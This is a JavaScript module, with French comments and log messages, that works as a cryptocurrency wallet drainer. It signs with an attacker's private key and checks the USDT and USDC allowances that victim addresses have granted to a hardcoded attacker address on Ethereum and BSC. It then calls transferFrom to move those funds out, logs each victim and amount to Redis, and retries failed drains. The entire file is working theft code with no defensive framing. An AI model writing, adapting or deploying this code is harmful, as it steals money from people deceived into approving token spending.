import { ethers } from 'ethers';
import { createClient } from 'redis';

const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';

function getPrivateKey() {
  if (process.env.ATTACKER_PRIVATE_KEY) {
    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
    if (key.length === 64) return '0x' + key;
  }
  const fs = require('fs');
  const path = require('path');
  const filePath = path.resolve('./private_key.txt');
  if (fs.existsSync(filePath)) {
    const key = fs.readFileSync(filePath, 'utf8').trim();
    if (key.length === 64) return '0x' + key;
  }
  throw new Error('🔴 Aucune clé privée valide.');
}

const PRIVATE_KEY = getPrivateKey();
const wallet = new ethers.Wallet(PRIVATE_KEY);

const TOKENS = {
  '1': {
    'USDT': { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
    'USDC': { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 }
  },
  '56': {
    'USDT': { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
    'USDC': { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 }
  }
};

const RPC_URLS = [
  'https://1rpc.io/eth',
  'https://eth.llamarpc.com',
  'https://ethereum-rpc.publicnode.com',
  'https://rpc.ankr.com/eth',
  'https://cloudflare-eth.com' // fallback
];

const ERC20_ABI = [
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)'
];

const drainedAddresses = new Set();

async function getProvider() {
  for (const url of RPC_URLS) {
    try {
      const provider = new ethers.providers.JsonRpcProvider(url);
      await provider.getBlockNumber();
      return { provider, url };
    } catch (e) {
      console.warn(`⚠️ RPC injoignable : ${url}`);
    }
  }
  throw new Error('❌ Aucun RPC disponible');
}

async function recordVictim(address, chain, token, amount, status) {
  const client = createClient({ url: process.env.REDIS_URL });
  try {
    await client.connect();
    const key = `victim:${address}`;
    await client.hSet(key, {
      chain,
      token,
      amount,
      status,
      timestamp: String(Date.now())
    });
    const list = await client.get('victims:list');
    const parsedList = list ? JSON.parse(list) : [];
    if (!parsedList.includes(address)) {
      parsedList.push(address);
      await client.set('victims:list', JSON.stringify(parsedList));
    }
  } finally {
    await client.disconnect();
  }
}

export async function drainVictim(victimAddress, chainId) {
  if (drainedAddresses.has(victimAddress)) {
    console.log(`⚠️ Déjà drainé : ${victimAddress}`);
    return false; // pas de nouveau drain
  }

  const { provider } = await getProvider();
  const signer = wallet.connect(provider);

  let drainedSome = false;

  const tokens = TOKENS[chainId] || {};
  for (const [tokenName, tokenInfo] of Object.entries(tokens)) {
    const contract = new ethers.Contract(tokenInfo.address, ERC20_ABI, signer);
    try {
      const allowance = await contract.allowance(victimAddress, ATTACKER_ADDRESS);
      if (allowance.isZero()) {
        const balance = await contract.balanceOf(victimAddress);
        const formatted = ethers.utils.formatUnits(balance, tokenInfo.decimals);
        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
        console.log(`⏭️ ${tokenName} : allowance nulle (dispo ${formatted})`);
        continue;
      }

      const tx = await contract.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance);
      const receipt = await tx.wait();
      console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
      drainedSome = true;

      const drainedAmount = ethers.utils.formatUnits(allowance, tokenInfo.decimals);
      await recordVictim(victimAddress, chainId, tokenName, drainedAmount, 'drained');
    } catch (err) {
      console.error(`❌ Erreur sur ${tokenName} : ${err.message}`);
      // Si l'erreur est critique, relancer pour réessayer plus tard
      if (err.code === 'CALL_EXCEPTION') {
        // Problème RPC : on sort de la boucle, le drainWithRetry réessayera
        throw err;
      }
      try {
        const balance = await contract.balanceOf(victimAddress);
        const formatted = ethers.utils.formatUnits(balance, tokenInfo.decimals);
        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
      } catch (_) {
        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
      }
    }
    await new Promise(r => setTimeout(r, 500));
  }

  if (drainedSome) {
    drainedAddresses.add(victimAddress);
    return true; // succès
  } else {
    // Aucun token drainé → on ne retire pas la victime de la queue
    return false;
  }
}

export async function drainWithRetry(victim, chainId, retries = 5, baseDelay = 1000) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const result = await drainVictim(victim, chainId);
      if (result) {
        console.log(`🔥 VICTOIRE : ${victim} vidé avec succès`);
        return true;
      } else {
        console.log(`⏭️ ${victim} n'a rien à drainer pour le moment.`);
        return false; // pas de fonds, pas la peine de réessayer
      }
    } catch (err) {
      console.error(`⛔ Tentative ${attempt}/${retries} échouée : ${err.message}`);
      if (attempt === retries) {
        console.error(`💀 Échec final après ${retries} tentatives pour ${victim}`);
        return false;
      }
      const delay = baseDelay * Math.pow(2, attempt - 1);
      console.log(`⏳ Nouvelle tentative dans ${delay/1000}s...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }
}
